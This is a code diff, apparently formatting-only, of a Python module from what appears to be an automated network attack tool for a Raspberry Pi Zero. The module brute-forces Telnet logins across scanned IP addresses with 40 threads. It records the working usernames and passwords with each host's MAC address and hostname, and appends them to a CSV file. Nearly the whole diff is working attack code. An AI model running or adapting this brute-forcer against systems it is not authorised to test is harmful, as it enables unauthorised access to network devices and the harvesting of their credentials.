@@ -25,10 +25,12 @@ b_status = "brute_force_telnet"
 b_port = 23
 b_parent = None
 
+
 class TelnetBruteforce:
     """
     Class to handle the brute-force attack process for Telnet servers.
     """
+
     def __init__(self, shared_data):
         self.shared_data = shared_data
         self.telnet_connector = TelnetConnector(shared_data)
@@ -39,19 +41,21 @@ class TelnetBruteforce:
         Perform brute-force attack on a Telnet server.
         """
         return self.telnet_connector.run_bruteforce(ip, port)
-    
+
     def execute(self, ip, port, row, status_key):
         """
         Execute the brute-force attack.
         """
         self.shared_data.bjornorch_status = "TelnetBruteforce"
         success, results = self.bruteforce_telnet(ip, port)
-        return 'success' if success else 'failed'
+        return "success" if success else "failed"
+
 
 class TelnetConnector:
     """
     Class to handle Telnet connections and credential testing.
     """
+
     def __init__(self, shared_data):
         self.shared_data = shared_data
         self.scan = pd.read_csv(shared_data.netkbfile)
@@ -91,14 +95,16 @@ class TelnetConnector:
         try:
             tn = telnetlib.Telnet(adresse_ip)
             tn.read_until(b"login: ", timeout=5)
-            tn.write(user.encode('ascii') + b"\n")
+            tn.write(user.encode("ascii") + b"\n")
             if password:
                 tn.read_until(b"Password: ", timeout=5)
-                tn.write(password.encode('ascii') + b"\n")
+                tn.write(password.encode("ascii") + b"\n")
 
             # Wait to see if the login was successful
             time.sleep(2)
-            response = tn.expect([b"Login incorrect", b"Password: ", b"$ ", b"# "], timeout=5)
+            response = tn.expect(
+                [b"Login incorrect", b"Password: ", b"$ ", b"# "], timeout=5
+            )
             tn.close()
 
             # Check if the login was successful
@@ -114,14 +120,20 @@ class TelnetConnector:
         """
         while not self.queue.empty():
             if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping worker thread.")
+                logger.info(
+                    "Orchestrator exit signal received, stopping worker thread."
+                )
                 break
 
             adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
             if self.telnet_connect(adresse_ip, user, password):
                 with self.lock:
-                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
-                    logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
+                    self.results.append(
+                        [mac_address, adresse_ip, hostname, user, password, port]
+                    )
+                    logger.success(
+                        f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}"
+                    )
                     self.save_results()
                     self.removeduplicates()
                     success_flag[0] = True
@@ -131,32 +143,51 @@ class TelnetConnector:
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
 
-        mac_address = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
-        hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
+        mac_address = self.scan.loc[
+            self.scan["IPs"] == adresse_ip, "MAC Address"
+        ].values[0]
+        hostname = self.scan.loc[self.scan["IPs"] == adresse_ip, "Hostnames"].values[0]
 
         total_tasks = len(self.users) * len(self.passwords)
-        
+
         for user in self.users:
             for password in self.passwords:
                 if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
+                    logger.info(
+                        "Orchestrator exit signal received, stopping bruteforce task addition."
+                    )
                     return False, []
-                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
+                self.queue.put(
+                    (adresse_ip, user, password, mac_address, hostname, port)
+                )
 
         success_flag = [False]
         threads = []
-        
-        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
-            task_id = progress.add_task("[cyan]Bruteforcing Telnet...", total=total_tasks)
-            
-            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
-                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
+
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(),
+            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        ) as progress:
+            task_id = progress.add_task(
+                "[cyan]Bruteforcing Telnet...", total=total_tasks
+            )
+
+            for _ in range(
+                40
+            ):  # Adjust the number of threads based on the RPi Zero's capabilities
+                t = threading.Thread(
+                    target=self.worker, args=(progress, task_id, success_flag)
+                )
                 t.start()
                 threads.append(t)
 
             while not self.queue.empty():
                 if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
+                    logger.info(
+                        "Orchestrator exit signal received, stopping bruteforce."
+                    )
                     while not self.queue.empty():
                         self.queue.get()
                         self.queue.task_done()
@@ -167,14 +198,32 @@ class TelnetConnector:
             for t in threads:
                 t.join()
 
-        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
+        return (
+            success_flag[0],
+            self.results,
+        )  # Return True and the list of successes if at least one attempt was successful
 
     def save_results(self):
         """
         Save the results of successful login attempts to a CSV file.
         """
-        df = pd.DataFrame(self.results, columns=['MAC Address', 'IP Address', 'Hostname', 'User', 'Password', 'Port'])
-        df.to_csv(self.telnetfile, index=False, mode='a', header=not os.path.exists(self.telnetfile))
+        df = pd.DataFrame(
+            self.results,
+            columns=[
+                "MAC Address",
+                "IP Address",
+                "Hostname",
+                "User",
+                "Password",
+                "Port",
+            ],
+        )
+        df.to_csv(
+            self.telnetfile,
+            index=False,
+            mode="a",
+            header=not os.path.exists(self.telnetfile),
+        )
         self.results = []  # Reset temporary results after saving
 
     def removeduplicates(self):
@@ -185,22 +234,25 @@ class TelnetConnector:
         df.drop_duplicates(inplace=True)
         df.to_csv(self.telnetfile, index=False)
 
+
 if __name__ == "__main__":
     shared_data = SharedData()
     try:
         telnet_bruteforce = TelnetBruteforce(shared_data)
         logger.info("Starting Telnet brute-force attack on port 23...")
-        
+
         # Load the netkb file and get the IPs to scan
         ips_to_scan = shared_data.read_data()
-        
+
         # Execute the brute-force attack on each IP
         for row in ips_to_scan:
             ip = row["IPs"]
             logger.info(f"Executing TelnetBruteforce on {ip}...")
             telnet_bruteforce.execute(ip, b_port, row, b_status)
-        
-        logger.info(f"Total number of successes: {len(telnet_bruteforce.telnet_connector.results)}")
+
+        logger.info(
+            f"Total number of successes: {len(telnet_bruteforce.telnet_connector.results)}"
+        )
         exit(len(telnet_bruteforce.telnet_connector.results))
     except Exception as e:
         logger.error(f"Error: {e}")
